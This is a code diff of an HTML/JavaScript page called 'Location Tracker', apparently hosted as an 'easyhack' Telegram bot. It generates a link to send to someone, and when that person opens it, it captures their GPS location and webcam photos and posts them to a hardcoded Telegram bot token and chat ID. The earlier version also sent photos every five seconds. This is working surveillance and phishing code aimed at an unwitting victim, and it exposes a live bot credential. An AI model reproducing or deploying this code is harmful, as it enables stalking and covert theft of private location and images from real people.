@@ -1,74 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        #video { display: none; width: 100%; max-width: 400px; }
+        #canvas { display: none; }
+        #status { margin: 20px; }
+    </style>
+</head>
 <body>
-    <h3>Allow Location and Camera Access</h3>
-    <p>Click "Allow" for both to share your location and live photos.</p>
-    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <h1>Location Tracker</h1>
     <p id="status">Waiting for permissions...</p>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const botToken = "7766871169:AAHWWs9KpQl_b3hVOkKWLnU66XFpYBo3hD8"; // Replace with your BotFather token
-        const telegramApi = `https://api.telegram.org/bot${botToken}/`;
-        const chatId = new URLSearchParams(window.location.search).get("chat_id");
-        const status = document.getElementById("status");
+        const botToken = "7766871169:AAHWWs9KpQl_b3hVOkKWLnU66XFpYBo3hD8";
+        const chatId = "1127560386"; // Your provided chat ID
+        const telegramApi = `https://api.telegram.org/bot${botToken}`;
+        const baseUrl = "https://easyhacktelegrambot.vercel.app";
 
-        // Send geolocation once
-        function sendLocation() {
-            navigator.geolocation.getCurrentPosition(position => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                const message = `Location: ${lat}, ${lng}\nGoogle Maps: ${mapsLink}`;
-                fetch(`${telegramApi}sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-                status.innerText = "Location sent! Now sending live photos...";
-            }, error => {
-                status.innerText = "Location access denied.";
-            });
+        const uniqueId = Math.random().toString(36).substring(2, 10); // Generate random ID
+        const trackingLink = `${baseUrl}/track/${uniqueId}`; // Unique link
+        console.log("Share this link:", trackingLink); // Log for testing
+
+        // Check if the URL contains the unique ID (i.e., link was opened)
+        if (window.location.pathname.includes("/track/")) {
+            // Request geolocation
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    document.getElementById("status").textContent = "Location captured! Now capturing photo...";
+
+                    // Send location to Telegram
+                    fetch(`${telegramApi}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`, {
+                        method: "POST"
+                    }).catch(error => console.error("Error sending location:", error));
+
+                    // Send Google Maps link
+                    fetch(`${telegramApi}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(googleMapsLink)}`, {
+                        method: "POST"
+                    }).catch(error => console.error("Error sending message:", error));
+
+                    // Request camera access and capture photo
+                    const video = document.getElementById("video");
+                    const canvas = document.getElementById("canvas");
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then((stream) => {
+                            video.srcObject = stream;
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext("2d").drawImage(video, 0, 0);
+                                const photoDataUrl = canvas.toDataURL("image/jpeg");
+
+                                // Stop the video stream
+                                stream.getTracks().forEach(track => track.stop());
+
+                                // Send photo to Telegram
+                                const formData = new FormData();
+                                formData.append("chat_id", chatId);
+                                formData.append("photo", dataURLtoBlob(photoDataUrl), "photo.jpg");
+
+                                fetch(`${telegramApi}/sendPhoto`, {
+                                    method: "POST",
+                                    body: formData
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.ok) {
+                                        document.getElementById("status").textContent = "Data sent to Telegram!";
+                                    } else {
+                                        document.getElementById("status").textContent = "Error: " + data.description;
+                                    }
+                                })
+                                .catch(error => {
+                                    document.getElementById("status").textContent = "Error sending photo: " + error;
+                                });
+                            }, 2000); // Capture photo after 2 seconds
+                        })
+                        .catch(error => {
+                            document.getElementById("status").textContent = "Camera access denied: " + error;
+                        });
+                },
+                (error) => {
+                    document.getElementById("status").textContent = "Geolocation denied: " + error.message;
+                }
+            );
+        } else {
+            document.getElementById("status").textContent = "Share this link with someone: " + trackingLink;
         }
 
-        // Set up camera and send photos every 5 seconds
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
-
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                sendLocation(); // Send location once camera is ready
-
-                // Capture and send photo every 5 seconds
-                setInterval(() => {
-                    context.drawImage(video, 0, 0, 320, 240);
-                    const photoData = canvas.toDataURL("image/jpeg");
-                    const formData = new FormData();
-                    formData.append("chat_id", chatId);
-                    formData.append("photo", dataURLtoBlob(photoData), "photo.jpg");
-
-                    fetch(`${telegramApi}sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    }).then(() => {
-                        status.innerText = "Photo sent! Updating every 5 seconds...";
-                    }).catch(() => {
-                        status.innerText = "Error sending photo.";
-                    });
-                }, 5000);
-            })
-            .catch(err => {
-                status.innerText = "Camera access denied.";
-            });
-
-        // Convert base64 data URL to Blob for Telegram API
-        function dataURLtoBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
+        // Helper function to convert base64 data URL to Blob
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(",");
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
             }
-            return new Blob([ab], { type: mimeString });
+            return new Blob([u8arr], { type: mime });
         }
     </script>
 </body>
